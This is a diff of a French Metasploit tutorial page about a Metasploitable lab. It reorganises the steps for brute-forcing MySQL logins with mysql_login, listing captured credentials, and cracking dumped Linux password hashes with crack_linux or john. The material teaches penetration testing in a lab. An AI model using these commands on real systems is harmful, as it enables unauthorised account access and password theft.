@@ -193,25 +193,26 @@ Pour une recherche par numéro de port :
 
 ## Informations de connexion
 
-Utiliser l'outil de découverte de mots de passe MySQL :
+??? info "Utilisation de l'outil de découverte de mots de passe MySQL ne fonctionne pas avec Kali 2024"
+    Utiliser l'outil de découverte de mots de passe MySQL :
 
-`use auxiliary/scanner/mysql/mysql_login`
+    `use auxiliary/scanner/mysql/mysql_login`
 
-`show options`
+    `show options`
 
-![06-msfconsole-mysql_login-options](../images/2020/06/06-msfconsole-mysql-login-options.png)
+    ![06-msfconsole-mysql_login-options](../images/2020/06/06-msfconsole-mysql-login-options.png)
 
-`hosts -R`
+    `hosts -R`
 
-`run`
+    `run`
 
-![06-msfconsole-scanner-mysql_login-run](../images/2020/06/06-msfconsole-scanner-mysql-login-run.png)
+    ![06-msfconsole-scanner-mysql_login-run](../images/2020/06/06-msfconsole-scanner-mysql-login-run.png)
 
-Les informations se retrouvent dans le contenant creds :
+    Les informations se retrouvent dans le contenant creds :
 
-`creds`
+    `creds`
 
-![06-msfconsole-creds](../images/2020/06/06-msfconsole-creds.png)
+    ![06-msfconsole-creds](../images/2020/06/06-msfconsole-creds.png)
 
 ## Les trésors (_loot_)
 
@@ -247,11 +248,28 @@ Essayons d'aller chercher les fichiers de mots de passe de Metasploitable :
 
 ![06-msfconsole-loot](../images/2020/06/06-msfconsole-loot.png)
 
-Après l'extraction des _loot_, il est possible de les déchiffrer avec l'outil `john` :  
+## Décryptage des _loot_
 
-`john --wordlist=/usr/share/john/password.lst --rules /root/.msf4/loot/20200605161359_default_192.168.40.7_linux.hashdump_159137603`
+`use auxiliary/analyze/crack_linux`
 
-![06-john-hashdump](../images/2020/06/06-john-hashdump.png)
+`show options`
+
+`set CUSTOM_WORDLIST /usr/share/john/password.lst`
+
+`set USE_DEFAULT_WORDLIST false`
+
+`set USE_ROOT_WORDS false`
+
+`run`
+
+![06-msfconsole-crack_linux](../images/2020/06/06-msfconsole-crack-linux.png)
+
+??? info "Décryptage des _loot_ avec `john` si ça ne marche pas avec crack_linux"
+    Après l'extraction des _loot_, il est possible de les déchiffrer avec l'outil `john` :  
+
+    `john --wordlist=/usr/share/john/password.lst --rules /root/.msf4/loot/20200605161359_default_192.168.40.7_linux.hashdump_159137603`
+
+    ![06-john-hashdump](../images/2020/06/06-john-hashdump.png)
 
 
 !!! important  
